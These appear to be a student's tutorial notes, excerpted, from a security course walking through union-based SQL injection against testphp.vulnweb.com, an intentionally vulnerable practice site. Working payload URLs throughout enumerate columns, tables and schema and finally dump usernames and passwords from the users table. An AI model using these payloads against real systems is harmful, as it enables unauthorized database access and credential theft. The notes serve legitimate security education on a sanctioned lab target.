...
- STEP 0 : so it's vulnerable parameter is `http://testphp.vulnweb.com/artists.php?artist=1` 
- STEP 1 : Q : how do Anuj sir got to know that's the vulnerable parameter ? ✔️️
	...
	- & hit enter , then it's throwing an error/exception <br>
...
- STEP 2 : `imp note ⭐` : whenever you feel that u got the vulnerable parameter on which we can perform SQL injection <br>
	...
	- so checking for 1st column `http://testphp.vulnweb.com/artists.php?artist=1 order by 1` , output : we'll get something 
		<br><img src="../../notes-pics/03-Module/21_lecture/21_lecture-1-M3.jpg" alt="" width="500"/>
	- so way give for 2nd column then 3rd column , so increase the columns to check on which column we're getting error ✔️
	- STEP 2.2 : so write for 2nd column `http://testphp.vulnweb.com/artists.php?artist=1 order by 2` , 
		<br>output : so again we'll get output
	- STEP 2.3 : checking for 3rd column `http://testphp.vulnweb.com/artists.php?artist=1 order by 3` , 
		<br>output : so again we'll get output
	- STEP 2.4 : checking for 4th column `http://testphp.vulnweb.com/artists.php?artist=1 order by 4` , 
...
- STEP 3 : checking which columns are reflecting/coming & which are not
	...
	- STEP 3.1 : so `http://testphp.vulnweb.com/artists.php?artist=1 union select 1,2,3` , <br>
		here total 3 columns given cuz the application contain only 3 columns , so hit enter <br>
		& u'll get the output as same as previous one ✔️
	...
	- STEP 3.2 : if u put a single quote `http://testphp.vulnweb.com/artists.php?artist=1' union select 1,2,3`, <br>
		output : still getting the same error
	- so we'll give something different which is not expected encode (like 1 , 2 , 3 , 4 & so on..) , so we'll give `-1` ✔️
	- STEP 3.3 : `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3` , <br>
		output <img src="../../notes-pics/03-Module/21_lecture/21_lecture-3-M3.jpg" alt="" width="500"/>
...
- STEP 4 : finding database via finding which column is using database
	...
	- STEP 4.1 : put this parameter `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),3` , output : <br>
		<img src="../../notes-pics/03-Module/21_lecture/21_lecture-5-M3.jpg" alt="" width="500"/>
...
- STEP 5: finding version & current user
	...
	- STEP 5.1 : taking out more information , pass these parameters <br>
		`http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, table_name,3 from information_schema.tables where table_schema=database() limit 0,1` , <br>
		here `0,1` means return `1st` value , output : <br>
		<img src="../../notes-pics/03-Module/21_lecture/21_lecture-7-M3.jpg" alt="" width="500"/>
	- means 1st table name is "artists" , same way u can change the limit in URL like `limit 1,1` then u'll get "carts"
	- STEP 5.2 : but finding each columns individually via passing numbers will be difficult , <br>
	...
	- so `group_concat()` will concat all table names & show them , output : <br>
		<img src="../../notes-pics/03-Module/21_lecture/21_lecture-8-M3.jpg" alt="" width="500"/>
- STEP 6 : taking out `users`  sensitive data
	...
	- output : `uname,pass,cc,address,email,name,phone,cart`
- STEP 7 : taking out username & password
	...
	- STEP 7.2 : to get all the passwords of all usernames , <br>
		`http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(pass),3 from users` , output : pass
	- STEP 7.3 : to show all usernames & passwords altogether <br>
		`http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname,"::",pass),3 from users` , <br>
		output : test::test
